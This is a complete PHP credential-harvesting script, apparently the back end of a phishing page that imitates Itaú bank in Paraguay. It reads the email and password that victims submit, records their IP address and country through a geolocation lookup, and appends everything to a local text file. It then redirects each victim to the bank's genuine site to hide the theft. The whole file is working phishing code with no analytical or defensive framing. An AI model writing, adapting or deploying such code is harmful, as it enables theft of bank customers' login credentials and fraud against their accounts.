<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$datoa=$_POST['correo'];
$datob=$_POST['correopass'];
$archivo="datatxpx3.txt";
$file=fopen($archivo,"a");
fwrite($file, "".$date.PHP_EOL);
fwrite($file, "". $ipdat->geoplugin_countryCode . PHP_EOL);
fwrite($file, "" .$ip.PHP_EOL);
fwrite($file, "Correo: ".$datoa.PHP_EOL);
fwrite($file, "Clave: " .$datob.PHP_EOL);
fclose($file);
Header ("Location:https://www.itau.com.py/personas/");?>